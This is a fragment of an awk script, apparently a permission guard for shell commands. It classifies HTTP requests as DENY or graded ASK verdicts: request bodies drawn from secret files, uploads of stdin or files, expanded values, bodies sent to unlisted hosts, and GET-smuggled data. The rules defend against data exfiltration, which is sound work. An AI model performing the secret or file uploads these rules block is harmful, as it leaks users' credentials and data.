            } else if (val ~ /\$/) expand = 1
          }
        }
        if (tok ~ /\$/) expand = 1
        if (dest == "" && tok !~ /^-/) { h = url_host(tok); if (h != "") dest = h }
      }

      if (secret != "") { print "DENY request body is sourced from a secret file: " unmark(secret); exit }
      # ASK2 is a deny at High; every other verdict here is an ask, held by pend.
      if (body && src == "stdin")       pend("ASK1 uploads piped stdin as a request body")
      else if (body && src != "")       pend("ASK1 uploads file \"" unmark(src) "\" as a request body")
      else if (body && inline) {
        if (expand)                     pend("ASK1 sends an expanded value as a request body")
        else if (MAXCLASS >= 2 && !safe_host(dest)) {
          v = "ASK2 sends an inline request body to " (dest == "" ? "an unparsed destination" : dest)
          if (MAXCLASS >= 3) { print v; exit }
          pend(v)
        }
      }
      else if (body && MAXCLASS >= 2 && !safe_host(dest)) {
        if (MAXCLASS >= 3) { print "ASK2 sends a request body"; exit }
        pend("ASK2 sends a request body")
      }
      else if (expand && MAXCLASS >= 3) pend("ASK3 an expansion rides in the request (possible GET-smuggled body)")
    }
  }
  # Nothing denied: the first ask held back, if any.
  if (PEND != "") print PEND
}
